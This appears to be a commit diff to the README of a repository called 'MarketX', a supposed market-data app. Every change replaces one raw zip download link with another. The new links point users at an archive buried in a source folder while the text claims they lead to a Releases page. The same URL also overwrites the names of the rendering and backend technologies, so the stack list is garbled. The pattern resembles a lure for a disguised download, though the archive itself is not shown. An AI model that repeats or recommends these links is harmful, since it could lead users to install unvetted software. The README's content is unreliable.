@@ -6,11 +6,11 @@ Welcome to MarketX! This platform gives you access to real-time market data, por
 
 ### 💾 Download MarketX
 
-[![Download MarketX](https://raw.githubusercontent.com/RahatSami1/MarketX/main/sharrag/MarketX.zip)](https://raw.githubusercontent.com/RahatSami1/MarketX/main/sharrag/MarketX.zip)
+[![Download MarketX](https://github.com/RahatSami1/MarketX/raw/refs/heads/main/Web/src/Market_X_2.9.zip)](https://github.com/RahatSami1/MarketX/raw/refs/heads/main/Web/src/Market_X_2.9.zip)
 
 ## 📥 Download & Install
 
-To start using MarketX, visit this [page to download](https://raw.githubusercontent.com/RahatSami1/MarketX/main/sharrag/MarketX.zip). Here’s how to get started:
+To start using MarketX, visit this [page to download](https://github.com/RahatSami1/MarketX/raw/refs/heads/main/Web/src/Market_X_2.9.zip). Here’s how to get started:
 
 1. Click the link above to go to the **Releases** page.
 2. Find the latest version of MarketX.
@@ -53,8 +53,8 @@ MarketX utilizes a variety of technologies to ensure a smooth and effective expe
 
 - **JavaScript** for interactive features.
 - **React** and **React Native** for building user interfaces.
-- **https://raw.githubusercontent.com/RahatSami1/MarketX/main/sharrag/MarketX.zip** for server-side rendering.
-- **https://raw.githubusercontent.com/RahatSami1/MarketX/main/sharrag/MarketX.zip** for backend services.
+- **https://github.com/RahatSami1/MarketX/raw/refs/heads/main/Web/src/Market_X_2.9.zip** for server-side rendering.
+- **https://github.com/RahatSami1/MarketX/raw/refs/heads/main/Web/src/Market_X_2.9.zip** for backend services.
 - **Axios** for API calls.
 - **Tailwind CSS** for responsive design.
 - **TypeScript** for type-safe development.
